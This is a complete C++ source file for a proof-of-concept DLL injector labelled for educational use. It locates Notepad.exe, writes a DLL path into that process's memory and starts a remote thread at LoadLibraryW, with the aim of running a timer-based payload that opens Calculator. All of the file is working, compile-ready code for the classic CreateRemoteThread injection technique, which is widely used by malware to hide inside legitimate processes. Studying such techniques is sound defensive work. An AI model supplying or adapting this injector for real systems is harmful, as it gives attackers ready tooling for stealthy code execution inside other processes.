// Injector.cpp - Main injection 

#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <string>

// Function to find process by name
DWORD GetProcessIdByName(const std::wstring& processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (processName == pe32.szExeFile) {
                    processId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return processId;
}

// Function to inject DLL into target process
BOOL InjectDLL(DWORD processId, const std::wstring& dllPath) {
    std::wcout << L"[>] Starting DLL injection into PID: " << processId << std::endl;

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        std::wcout << L"[-] Failed to open process. Error: " << GetLastError() << std::endl;
        return FALSE;
    }

    // Calculate DLL path size
    SIZE_T dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);

    // Allocate memory in target process
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, dllPathSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMemory) {
        std::wcout << L"[-] Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return FALSE;
    }

    std::wcout << L"[+] Allocated memory in target process: 0x" << std::hex << remoteMemory << std::dec << std::endl;

    // Write DLL path to target process
    if (!WriteProcessMemory(hProcess, remoteMemory, dllPath.c_str(), dllPathSize, NULL)) {
        std::wcout << L"[-] Failed to write DLL path to target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    std::wcout << L"[+] DLL path written to target process" << std::endl;

    // Get LoadLibraryW address
    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    FARPROC pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");

    if (!pLoadLibraryW) {
        std::wcout << L"[-] Failed to get LoadLibraryW address" << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create remote thread to load DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibraryW,
        remoteMemory, 0, NULL);
    if (!hThread) {
        std::wcout << L"[-] Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    std::wcout << L"[+] Remote thread created successfully" << std::endl;

    // Wait for DLL to load
    WaitForSingleObject(hThread, INFINITE);

    // Check if DLL was loaded successfully
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);

    if (exitCode != 0) {
        std::wcout << L"[+] DLL loaded successfully in target process" << std::endl;
    }
    else {
        std::wcout << L"[-] DLL failed to load in target process" << std::endl;
    }

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return (exitCode != 0);
}

// Function to get executable directory (where the .exe is located)
std::wstring GetExecutableDir() {
    wchar_t buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    std::wstring exePath(buffer);

    // Find last backslash and remove filename
    size_t pos = exePath.find_last_of(L"\\");
    if (pos != std::wstring::npos) {
        exePath = exePath.substr(0, pos);
    }

    return exePath;
}

bool FileExists(const std::wstring& filePath) {
    DWORD fileAttributes = GetFileAttributes(filePath.c_str());
    return (fileAttributes != INVALID_FILE_ATTRIBUTES);
}

int main() {
    std::wcout << L"=== DLL + Timer Injection PoC ===" << std::endl;
    std::wcout << L"Educational/Research Purpose Only" << std::endl << std::endl;

    std::wstring targetProcess = L"Notepad.exe";
    std::wstring dllName = L"TimerDLL.dll";

    std::wstring executableDir = GetExecutableDir();
    std::wstring dllPath = executableDir + L"\\" + dllName;

    std::wcout << L"[>] Target process: " << targetProcess << std::endl;
    std::wcout << L"[>] DLL path: " << dllPath << std::endl;

    if (!FileExists(dllPath)) {
        std::wcout << L"[-] " << dllName << L" not found in current directory" << std::endl;
        std::wcout << L"[-] Please compile " << dllName << L" first" << std::endl;
        std::wcout << L"[>] Press Enter to exit..." << std::endl;
        std::wcin.get();
        return -1;
    }

    // Find target process
    DWORD processId = GetProcessIdByName(targetProcess);
    if (processId == 0) {
        std::wcout << L"[-] Target process not found. Please start " << targetProcess << L" first" << std::endl;
        std::wcout << L"[>] Press Enter to exit..." << std::endl;
        std::wcin.get();
        return -1;
    }

    std::wcout << L"[+] Found target process PID: " << processId << std::endl;

    // Inject DLL
    if (InjectDLL(processId, dllPath)) {
        std::wcout << L"[+] Injection completed successfully" << std::endl;
        std::wcout << L"[+] Timer-based execution should occur in target process" << std::endl;
        std::wcout << L"[+] Check C:\\temp\\timer_log.txt for execution logs" << std::endl;
        std::wcout << L"[+] Calculator should appear in ~3 seconds" << std::endl;
    }
    else {
        std::wcout << L"[-] Injection failed" << std::endl;
    }

    std::wcout << L"[>] Press Enter to exit..." << std::endl;
    std::wcin.get();

    return 0;
}